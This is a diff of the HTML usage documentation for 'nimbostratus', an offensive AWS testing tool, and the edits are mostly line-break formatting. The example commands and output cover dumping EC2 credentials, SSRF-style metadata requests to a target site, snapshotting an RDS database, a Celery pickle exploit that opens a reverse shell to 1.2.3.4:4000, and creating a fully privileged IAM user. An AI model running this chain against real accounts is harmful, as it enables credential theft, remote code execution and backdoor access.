@@ -75,8 +75,7 @@ provided using the following command line arguments:</p>
 This is usually the first command to run after gaining access to an EC2 instance.</p>
 
 <div class="highlight"><pre><span class="gp">$</span> nimbostratus dump-credentials
-<span class="go">
-Found credentials
+<span class="go">Found credentials
   Access key: ...
   Secret key: ...
 </span>
@@ -96,8 +95,7 @@ the credentials won't be dumped.</p>
 right after <code>dump-credentials</code> to know which permissions are available for you.</p>
 
 <div class="highlight"><pre><span class="gp">$</span> nimbostratus dump-permissions --access-key<span class="o">=</span>... --secret-key<span class="o">=</span>...
-<span class="go">
-Starting dump-permissions
+<span class="go">Starting dump-permissions
 These credentials belong to low_privileged_user, not to the root account
 Getting access keys for user low_privileged_user
 User for key AKIAIV...J6KVA is low_privileged_user
@@ -125,8 +123,7 @@ provider and running this command on different instances will yield different re
 <p>Extract meta-data for the instance where the command is being run:</p>
 
 <div class="highlight"><pre><span class="gp">$</span> nimbostratus dump-ec2-metadata
-<span class="go">
-Starting dump-ec2-metadata
+<span class="go">Starting dump-ec2-metadata
 ...
 Instance type: t1.micro
 AMI ID: ami-a02f66f2
@@ -141,11 +138,10 @@ User data script was written to user-data.txt
 <p>Extract meta-data from a remote instance using an exploit defined in <code>core.utils.mangle.mangle</code>:</p>
 
 <div class="highlight"><pre><span class="gp">$</span> nimbostratus dump-ec2-metadata --mangle-function=core.utils.mangle.mangle
-<span class="go">
-Starting dump-ec2-metadata
-Request http://target.com/?url=http://169.254.169.254/latest/meta-data/
-Request http://target.com/?url=http://169.254.169.254/latest/meta-data/instance-type
-Request http://target.com/?url=http://169.254.169.254/latest/meta-data/instance-id
+<span class="go">Starting dump-ec2-metadata
+Request http://target.com/?url=http://169.254.169.254/...ta-data/
+Request http://target.com/?url=http://169.254.169.254/...ta-data/instance-type
+Request http://target.com/?url=http://169.254.169.254/...ta-data/instance-id
 ...
 Instance type: t1.micro
 AMI ID: ami-a02f66f2
@@ -167,9 +163,9 @@ that database by creating a snapshot and restoring it.</p>
 
 <div class="highlight"><pre><span class="gp">$</span> nimbostratus snapshot-rds --access-key<span class="o">=</span>... <span class="se">\</span>
                  --secret-key<span class="o">=</span>... <span class="se">\</span>
-                 --password foolmeonce --rds-name nimbostratus --region ap-southeast-1
-<span class="go">
-Starting snapshot-rds
+                 --password foolmeonce --rds-name nimbostratus <span class="se">\</span>
+                 --region ap-southeast-1
+<span class="go">Starting snapshot-rds
 Waiting for snapshot to complete in AWS... (this takes at least 5m)
 Waiting...
 Waiting for restore process in AWS... (this takes at least 5m)
@@ -196,8 +192,7 @@ finally inject a raw message that will execute arbitrary commands when un-pickle
 <div class="highlight"><pre><span class="gp">$</span> nimbostratus celery-pickle-exploit --access-key<span class="o">=</span>... <span class="se">\</span>
                   --secret-key<span class="o">=</span>... --reverse 1.2.3.4:4000 <span class="se">\</span>
                   --queue-name nimbostratus-celery --region ap-southeast-1
-<span class="go">
-Starting celery-exploit
+<span class="go">Starting celery-exploit
 SQS queue nimbostratus-celery is vulnerable
 We can write to the SQS queue.
 Start a netcat to listen for connections at 1.2.3.4:4000 and press enter.
@@ -213,8 +208,7 @@ Sent payload to SQS, wait for the reverse connection!
 create it (with permissions to access all Amazon resources) and return API key and secret.</p>
 
 <div class="highlight"><pre><span class="gp">$</span> nimbostratus create-iam-user --access-key<span class="o">=</span>... --secret-key<span class="o">=</span>...
-<span class="go">
-Starting create-iam-user
+<span class="go">Starting create-iam-user
 Trying to create user "bdkgpnenu"
 User "bdkgpnenu" created
 Trying to create user "bdkgpnenu" access keys
